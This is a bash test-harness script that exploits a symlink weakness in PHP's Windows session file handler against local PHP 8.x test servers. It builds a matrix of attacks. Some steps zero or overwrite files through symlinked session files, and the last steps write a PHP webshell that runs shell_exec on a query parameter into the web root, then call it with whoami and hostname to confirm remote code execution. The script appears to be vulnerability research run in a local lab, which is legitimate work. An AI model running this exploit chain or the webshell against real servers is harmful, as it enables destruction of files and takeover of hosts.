#!/bin/bash
# wp3_win_lab.sh - Target 1 WINDOWS lane (v2). Runs on the WINDOWS HOST git-bash.
# PHP session files handler on ZEND_WIN32: O_NOFOLLOW #defined to 0 (no symlink
# protection) and uid-ownership check is #ifndef PHP_WIN32 (absent).
# Matrix (all requests unauth multipart POST w/ PHP_SESSION_UPLOAD_PROGRESS):
#   W1 control: regular sess + pipe key            -> sess wiped (parity check)
#   W2: symlink -> garbage-pipe target             -> decode fail, LINK unlinked, target intact
#   W3: symlink -> VALID-session target + pipe     -> TARGET zeroed (file-zeroing primitive)
#   W4: symlink -> valid-session target + clean key, slow upload -> transient overwrite capture
#   W5: DANGLING symlink + pipe key                -> target created 0-byte?
#   W6: DANGLING symlink -> docroot/shell.php + payload key + cleanup=0 -> webshell written
#   W7: GET /shell.php?c=...                       -> RCE receipt
WP3=/c/Users/andre/Downloads/php2shell-claude/wp3
PY=/c/Python313/python
UPCLIENT=/c/Users/andre/Downloads/php2shell-claude/wp2/wp2_upclient.py
REC=$WP3/receipts/win
mkdir -p "$REC"

hexkey() { "$PY" -c 'import sys;print(sys.argv[1].encode().hex())' "$1"; }

mklink_any() { # $1=link(msys) $2=target(msys) - target may not exist (dangling)
  "$PY" -c 'import os,sys; os.symlink(sys.argv[2], sys.argv[1])' \
    "$(cygpath -w "$1")" "$(cygpath -w "$2")" 2>/dev/null && return 0
  powershell.exe -NoProfile -Command "New-Item -ItemType SymbolicLink -Path '$(cygpath -w "$1")' -Target '$(cygpath -w "$2")' | Out-Null" 2>/dev/null && return 0
  return 1
}

start_server() { # $1=ver $2=port $3=cleanup(0|1)
  local ver="$1" port="$2" cleanup="$3"
  local lab="$WP3/win_lab/$ver"
  local drive=$(cygpath -m "$lab")
  mkdir -p "$lab/sess" "$lab/tmp" "$lab/docroot"
  cat > "$lab/php.ini" <<EOF
session.save_handler = files
session.save_path = "$drive/sess"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = $cleanup
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
max_file_uploads = 64
memory_limit = 1024M
upload_tmp_dir = "$drive/tmp"
EOF
  cp "$WP3/docroot/up.php" "$lab/docroot/up.php"
  "$WP3/winphp/$ver/php.exe" -c "$lab/php.ini" -S 127.0.0.1:$port -t "$lab/docroot" \
    >> "$lab/server_out.log" 2>> "$lab/server_err.log" &
  SRVPID=$!
  local i
  for i in $(seq 1 80); do
    curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$port/up.php" && return 0
    sleep 0.25
  done
  echo "SERVER-START-FAILED ver=$ver port=$port"; return 1
}

stop_server() {
  if [ -n "$SRVPID" ]; then
    kill "$SRVPID" 2>/dev/null; sleep 1.2
    kill -0 "$SRVPID" 2>/dev/null && kill -9 "$SRVPID" 2>/dev/null
    sleep 0.3
  fi
  SRVPID=""
}

snap() {
  local f="$1"
  if [ -e "$f" ]; then
    echo "EXISTS size=$(stat -c %s "$f") head=$(head -c 60 "$f" | tr -d '\0' | tr '\n' ' ')"
  else
    echo "MISSING"
  fi
}

linkstate() {
  if [ -L "$1" ]; then echo "SYMLINK->$(readlink "$1")"; elif [ -e "$1" ]; then echo "REGULAR-FILE size=$(stat -c %s "$1")"; else echo "GONE"; fi
}

shot() { # $1=port $2=mode $3=sid $4=keyhex $5.. extra
  local port="$1" mode="$2" sid="$3" key="$4"; shift 4
  "$PY" "$UPCLIENT" "$port" "$mode" "$sid" --key "$key" --timeout 60 "$@" 2>&1
}

run_ver() { # $1=ver $2=portClean $3=portNoclean
  local ver="$1" pc="$2" pn="$3"
  local lab="$WP3/win_lab/$ver"
  local out="$REC/${ver}_matrix.log"
  rm -f "$lab/server_out.log" "$lab/server_err.log"
  : > "$out"
  echo "================ PHP $ver (Windows, ZTS) ================" | tee -a "$out"
  rm -f "$lab"/sess/* "$lab"/tmp/* "$lab"/docroot/shell.php "$lab"/target_*.txt 2>/dev/null
  start_server "$ver" "$pc" 1 || return 1
  echo "ini save_path: $("$WP3/winphp/$ver/php.exe" -c "$lab/php.ini" -r 'echo ini_get("session.save_path");')" | tee -a "$out"

  # ---------- W1: control ----------
  local sid=wl1aaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/sess/sess_$sid"
  echo "--- W1 regular sess file + pipe poison (control)" | tee -a "$out"
  echo "before: $(snap "$lab/sess/sess_$sid")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_w1_client.log"
  echo "after:  $(snap "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- W3: symlink -> FULLY-valid session target + pipe ----------
  sid=wl3aaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/target_w3.txt"
  rm -f "$lab/sess/sess_$sid"
  mklink_any "$lab/sess/sess_$sid" "$lab/target_w3.txt" || { echo "MKLINK-FAILED-W3" | tee -a "$out"; }
  echo "--- W3 symlink -> valid-session target + pipe poison" | tee -a "$out"
  echo "link: $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"
  echo "target before: $(snap "$lab/target_w3.txt")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_w3_client.log"
  echo "target after:  $(snap "$lab/target_w3.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- W2: symlink -> garbage target (decode fail) ----------
  sid=wl2aaaaaaaaaaaaaaaaaaaaaaaa
  printf 'GARBAGE_NO_DECODE|x' > "$lab/target_w2.txt"
  rm -f "$lab/sess/sess_$sid"
  mklink_any "$lab/sess/sess_$sid" "$lab/target_w2.txt" || echo "MKLINK-FAILED-W2" | tee -a "$out"
  echo "--- W2 symlink -> pipe-garbage target (decode fail -> destroy)" | tee -a "$out"
  echo "target before: $(snap "$lab/target_w2.txt")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_w2_client.log"
  echo "target after:  $(snap "$lab/target_w2.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- W4: symlink -> valid target + clean key, SLOW upload, capture transient ----------
  sid=wl4aaaaaaaaaaaaaaaaaaaaaaaa
  printf 'pref|s:6:"keepme";' > "$lab/target_w4.txt"
  rm -f "$lab/sess/sess_$sid"
  mklink_any "$lab/sess/sess_$sid" "$lab/target_w4.txt" || echo "MKLINK-FAILED-W4" | tee -a "$out"
  echo "--- W4 symlink -> valid-session target + CLEAN key + SLOW upload (transient capture)" | tee -a "$out"
  echo "target before: $(snap "$lab/target_w4.txt")" | tee -a "$out"
  ( shot "$pc" slow "$sid" 6f6b --chunk 4096 --delay 0.08 > "$REC/${ver}_w4_client.log" ) &
  local slowpid=$!
  local t trans=NO
  for t in 1 2 3 4 5 6; do
    sleep 0.55
    if [ -e "$lab/target_w4.txt" ] && [ "$(stat -c %s "$lab/target_w4.txt")" -gt 18 ]; then
      trans="YES size=$(stat -c %s "$lab/target_w4.txt") head=$(head -c 80 "$lab/target_w4.txt" | tr -d '\0')"
      cp "$lab/target_w4.txt" "$REC/${ver}_w4_transient.bin" 2>/dev/null
      break
    fi
  done
  wait $slowpid
  echo "transient overwrite captured: $trans" | tee -a "$out"
  echo "target after:  $(snap "$lab/target_w4.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"

  # ---------- W5: DANGLING symlink + pipe ----------
  sid=wl5aaaaaaaaaaaaaaaaaaaaaaaa
  rm -f "$lab/target_w5.txt" "$lab/sess/sess_$sid"
  mklink_any "$lab/sess/sess_$sid" "$lab/target_w5.txt" || echo "MKLINK-FAILED-W5" | tee -a "$out"
  echo "--- W5 DANGLING symlink -> nonexistent target + pipe poison" | tee -a "$out"
  echo "link: $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"
  echo "target before: $(snap "$lab/target_w5.txt")" | tee -a "$out"
  shot "$pc" full "$sid" 417C42 > "$REC/${ver}_w5_client.log"
  echo "target after:  $(snap "$lab/target_w5.txt")" | tee -a "$out"
  echo "link after:    $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"
  stop_server

  # ---------- W6/W7 on cleanup=0 server: webshell drop ----------
  start_server "$ver" "$pn" 0 || return 1
  sid=wl6aaaaaaaaaaaaaaaaaaaaaaaa
  local PAYLOAD='<?php echo "WP3_RCE_OK[".shell_exec($_GET["c"])."]"; ?>'
  local KEYHEX=$(hexkey "$PAYLOAD")
  rm -f "$lab/docroot/shell.php" "$lab/sess/sess_$sid"
  mklink_any "$lab/sess/sess_$sid" "$lab/docroot/shell.php" || echo "MKLINK-FAILED-W6" | tee -a "$out"
  echo "--- W6 DANGLING symlink -> docroot/shell.php + payload key + cleanup=0 + full upload" | tee -a "$out"
  echo "payload key: $PAYLOAD" | tee -a "$out"
  echo "link: $(linkstate "$lab/sess/sess_$sid")" | tee -a "$out"
  echo "shell before: $(snap "$lab/docroot/shell.php")" | tee -a "$out"
  shot "$pn" full "$sid" "$KEYHEX" > "$REC/${ver}_w6_client.log"
  echo "shell after:  $(snap "$lab/docroot/shell.php")" | tee -a "$out"
  if [ -e "$lab/docroot/shell.php" ]; then
    echo "shell content (first 320B):" | tee -a "$out"
    head -c 320 "$lab/docroot/shell.php" | tee -a "$out"; echo | tee -a "$out"
    cp "$lab/docroot/shell.php" "$REC/${ver}_dropped_shell.php" 2>/dev/null
  fi
  echo "--- W7 GET /shell.php?c=whoami" | tee -a "$out"
  curl -s --max-time 10 "http://127.0.0.1:$pn/shell.php?c=whoami" | tee -a "$out"; echo | tee -a "$out"
  curl -s --max-time 10 "http://127.0.0.1:$pn/shell.php?c=echo%20WP3_PWNED" | tee -a "$out"; echo | tee -a "$out"
  curl -s --max-time 10 "http://127.0.0.1:$pn/shell.php?c=hostname" | tee -a "$out"; echo | tee -a "$out"
  stop_server

  cp "$lab/server_out.log" "$lab/server_err.log" "$REC/" 2>/dev/null
  echo "=== end $ver matrix ===" | tee -a "$out"
}

SRVPID=""
run_ver 8512 18801 18803
run_ver 8134 18802 18804
echo "receipts: $REC"
